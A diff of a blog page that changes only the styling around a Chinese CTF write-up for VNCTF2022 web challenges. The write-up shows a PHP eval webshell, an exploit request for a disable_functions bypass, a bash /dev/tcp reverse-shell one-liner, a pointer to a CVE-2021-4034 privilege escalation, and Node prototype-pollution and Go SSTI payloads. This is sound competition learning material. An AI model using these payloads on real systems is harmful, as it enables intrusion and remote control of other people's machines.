@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -245,14 +253,14 @@
               </p>
             
             <div class="markdown-body">
-              <h2 id="InterestingPHP"><a href="#InterestingPHP" class="headerlink" title="InterestingPHP"></a>InterestingPHP</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> highlight_file(<span class="hljs-keyword">__FILE__</span>); @<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">&#x27;exp&#x27;</span>]);<span class="hljs-meta">?&gt;</span></code></pre></div>
+              <h2 id="InterestingPHP"><a href="#InterestingPHP" class="headerlink" title="InterestingPHP"></a>InterestingPHP</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> highlight_file(<span class="hljs-keyword">__FILE__</span>); @<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">&#x27;exp&#x27;</span>]);<span class="hljs-meta">?&gt;</span></code></pre>
 <p>phpinfo被ban,可以<code>var_dump(ini_get_all());</code></p>
 <p><code>disable_function</code>  </p>
 <p><code>open_basedir</code></p>
 <p><code>bypass</code>—-&gt;<code>https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php</code></p>
 <p>fwrite 被禁了，改成 fputs</p>
 <p>一句话改为<code>POST</code>传值<code>?exp=eval($_POST[1]);</code>，构造表单</p>
-<div class="hljs"><pre><code>POST /?exp=eval($_POST[1]); HTTP/1.1
+<pre><code>POST /?exp=eval($_POST[1]); HTTP/1.1
 Host: 7c04b880-d3fb-4428-b036-3b2c06f5ae68.node4.buuoj.cn:81
 Content-Length: 6915
 Content-Type:multipart/form-data;boundary=----WebKitFormBoundaryj28zfvoWVxnHdp29
@@ -461,14 +469,14 @@ class Pwn extends php_user_filter &#123;
         return str_shuffle(str_repeat(&#39;A&#39;, $size));
     &#125;
 &#125;
-------WebKitFormBoundaryj28zfvoWVxnHdp29--</code></pre></div>
+------WebKitFormBoundaryj28zfvoWVxnHdp29--</code></pre>
 <p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202202180010240.png" srcset="/img/loading.gif"></p>
 <p>反弹shell<br><code>bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/xxx.xx.xxx.xxx/9000 &lt;&amp;1&#39;</code></p>
 <p><code>https://github.com/arthepsy/CVE-2021-4034 提权</code></p>
 <p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202202180013878.png" srcset="/img/loading.gif"><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202202180014352.png" srcset="/img/loading.gif"></p>
 <p><a target="_blank" rel="noopener" href="https://blog.m1n.me/2022/02/13/VNCTF2022-Web-WP/">MORE</a></p>
 <h2 id="gocalc0"><a href="#gocalc0" class="headerlink" title="gocalc0"></a>gocalc0</h2><p>go ssti<br><code>&#123;&#123;.&#125;&#125;</code>获取源码</p>
-<div class="hljs"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main
+<pre><code class="hljs go"><span class="hljs-keyword">package</span> main
 
 <span class="hljs-keyword">import</span> (
 	_ <span class="hljs-string">&quot;embed&quot;</span>
@@ -587,11 +595,11 @@ class Pwn extends php_user_filter &#123;
 	&#125;)
 
 	r.Run(fmt.Sprintf(<span class="hljs-string">&quot;:%s&quot;</span>, port))
-&#125;</code></pre></div>
+&#125;</code></pre>
 
 
 <p>本地开启输出flag</p>
-<div class="hljs"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main
+<pre><code class="hljs go"><span class="hljs-keyword">package</span> main
 
 <span class="hljs-keyword">import</span> (
 	_ <span class="hljs-string">&quot;embed&quot;</span>
@@ -616,10 +624,10 @@ class Pwn extends php_user_filter &#123;
 		<span class="hljs-built_in">println</span>(session.Get(<span class="hljs-string">&quot;FLAG&quot;</span>).(<span class="hljs-keyword">string</span>))
 	&#125;)
 	r.Run(fmt.Sprintf(<span class="hljs-string">&quot;:%s&quot;</span>, port))
-&#125;</code></pre></div>
+&#125;</code></pre>
 
 <h2 id="newcalc0"><a href="#newcalc0" class="headerlink" title="newcalc0"></a>newcalc0</h2><p>nodejs原型链污染<br><a target="_blank" rel="noopener" href="https://nodejs.org/en/blog/vulnerability/jan-2022-security-releases/#prototype-pollution-via-console-table-properties-low-cve-2022-21824">CVE-2022-21824</a></p>
-<div class="hljs"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>);
+<pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>);
 <span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;path&quot;</span>);
 <span class="hljs-keyword">const</span> vm2 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm2&quot;</span>);
 
@@ -666,16 +674,16 @@ app.use(<span class="hljs-function">(<span class="hljs-params">err, req, res, ne
   res.redirect(<span class="hljs-string">&quot;index.html&quot;</span>);
 &#125;);
 
-app.listen(process.env.PORT || <span class="hljs-number">8888</span>);</code></pre></div>
+app.listen(process.env.PORT || <span class="hljs-number">8888</span>);</code></pre>
 
 <p>payload:<code>console.table([&#123;x:1&#125;], [&quot;__proto__&quot;]);</code></p>
 <p><a target="_blank" rel="noopener" href="https://chowdera.com/2022/02/202202161841265824.html">MORE</a></p>
 <h2 id="easyJava"><a href="#easyJava" class="headerlink" title="easyJava"></a>easyJava</h2><p>User类的<code>height</code>属性被<code>transient</code>修饰<br><a target="_blank" rel="noopener" href="https://www.baeldung.com/java-transient-keyword">https://www.baeldung.com/java-transient-keyword</a><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202202181825968.png" srcset="/img/loading.gif"><br>也就是transient修饰的变量无法直接反序列化<br>需要在User类中重写<code>writeObject</code>方法</p>
-<div class="hljs"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span> <span class="hljs-keyword">throws</span> java.io.IOException</span>&#123;
+<pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span> <span class="hljs-keyword">throws</span> java.io.IOException</span>&#123;
  s.defaultWriteObject();
  <span class="hljs-comment">//强制序列化name</span>
  s.writeObject(<span class="hljs-keyword">this</span>.height);
-&#125;</code></pre></div>
+&#125;</code></pre>
 
 
             </div>
@@ -836,6 +844,8 @@ app.listen(process.env.PORT || <span class="hljs-number">8888</span>);</code></p
 
 
 
+  
+    
   
 
 
